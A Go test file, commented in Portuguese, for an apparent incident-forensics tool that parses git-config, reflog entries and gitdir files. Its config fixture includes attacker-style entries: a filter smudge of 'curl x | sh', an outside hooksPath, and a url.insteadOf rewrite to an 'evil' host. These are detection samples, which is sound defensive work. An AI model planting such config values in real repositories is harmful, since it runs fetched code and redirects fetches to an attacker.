package facts

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/env"
)

// O formato do git-config é onde ele morde: subseção entre aspas, chave sem
// caixa, e a subseção COM caixa. Achatar tudo faria `[filter "Lfs"]` colidir
// com `[filter "lfs"]`.
func TestParseConfigGitSeparaSubsecao(t *testing.T) {
	got := ParseConfigGit(`# comentário
[core]
	hooksPath = ../fora
[filter "limpa"]
	smudge = curl x | sh
[remote "origin"]
	url = git@github.com:a/b.git
[url "http://evil/"]
	insteadOf = https://github.com/
`)
	quer := map[string]string{
		"core.hookspath":             "../fora",
		"filter.limpa.smudge":        "curl x | sh",
		"remote.origin.url":          "git@github.com:a/b.git",
		"url.http://evil/.insteadof": "https://github.com/",
	}
	for _, o := range got {
		v, ok := quer[o.Chave]
		if !ok {
			t.Errorf("chave inesperada: %q", o.Chave)
			continue
		}
		if o.Valor != v {
			t.Errorf("%s = %q, queria %q", o.Chave, o.Valor, v)
		}
		delete(quer, o.Chave)
	}
	for k := range quer {
		t.Errorf("chave perdida: %q", k)
	}
}

// O sha ANTERIOR é a única coisa aqui com prazo: é ele que devolve o conteúdo
// que um `--amend` tirou da branch, e ele some no próximo `gc`.
func TestParseLinhaDeReflogGuardaOShaAnterior(t *testing.T) {
	ln := "5e856d20a0d4f54d3e129ab87b99c712a209fb77 " +
		"9f1c3e2b1a4d5c6e7f8a9b0c1d2e3f4a5b6c7d8e " +
		"invasor da Silva <invasor@evil.tld> 1755524332 +0000\t" +
		"commit (amend): fix typo"
	ent, ok := ParseLinhaDeReflog(ln)
	if !ok {
		t.Fatal("linha válida de reflog não foi entendida")
	}
	if ent.De != "5e856d20a0d4f54d3e129ab87b99c712a209fb77" {
		t.Errorf("sha anterior = %q", ent.De)
	}
	if ent.Acao != "commit (amend)" {
		t.Errorf("ação = %q — é ela que separa reescrita de trabalho normal", ent.Acao)
	}
	// Nome COM espaço: cortar por campo comeria o sobrenome.
	if ent.Quem != "invasor da Silva <invasor@evil.tld>" {
		t.Errorf("quem = %q", ent.Quem)
	}
	if ent.QuandoU == "" {
		t.Error("a data precisa sair: é ela que se compara com a janela do incidente")
	}
}

// Data ilegível vira VAZIO, não "agora": data inventada num relatório de
// incidente é pior que data ausente.
func TestReflogComDataIlegivelNaoInventaData(t *testing.T) {
	ent, ok := ParseLinhaDeReflog("a b nome <n@e> ontem +0000\tcommit: x")
	if !ok {
		t.Fatal("a linha continua sendo entendida")
	}
	if ent.QuandoU != "" {
		t.Errorf("data = %q, queria vazio", ent.QuandoU)
	}
}

// `.git` pode ser ARQUIVO: worktree e submódulo põem ali um "gitdir:"
// apontando para outro lugar. Tratar só o diretório deixaria de fora
// justamente onde um repositório extra passa despercebido.
func TestGitDirComoArquivoEhSeguido(t *testing.T) {
	raiz := t.TempDir()
	real := filepath.Join(raiz, "guardado")
	trab := filepath.Join(raiz, "arvore")
	if err := os.MkdirAll(real, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(trab, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(real, "HEAD"), []byte("ref: refs/heads/x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(trab, ".git"), []byte("gitdir: /guardado\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	e := env.Probe(env.Options{Root: raiz})
	t.Cleanup(func() { e.Close() })

	r := LerRepoGit(&Facts{}, e, "/arvore")
	if r == nil {
		t.Fatal("worktree não foi reconhecida como repositório")
	}
	if r.GitDir != "/guardado" {
		t.Errorf("gitDir = %q, queria /guardado", r.GitDir)
	}
	if !strings.Contains(r.HEAD, "refs/heads/x") {
		t.Errorf("HEAD = %q: o gitdir apontado é que tem os arquivos", r.HEAD)
	}
}

// Diretório que não é repositório devolve nil, e não um censo vazio: "não há
// repositório aqui" e "há um repositório e ele está limpo" são respostas
// opostas.
func TestDiretorioSemGitNaoViraRepoVazio(t *testing.T) {
	raiz := t.TempDir()
	e := env.Probe(env.Options{Root: raiz})
	t.Cleanup(func() { e.Close() })
	if r := LerRepoGit(&Facts{}, e, "/"); r != nil {
		t.Errorf("diretório sem git devolveu %+v", r)
	}
}
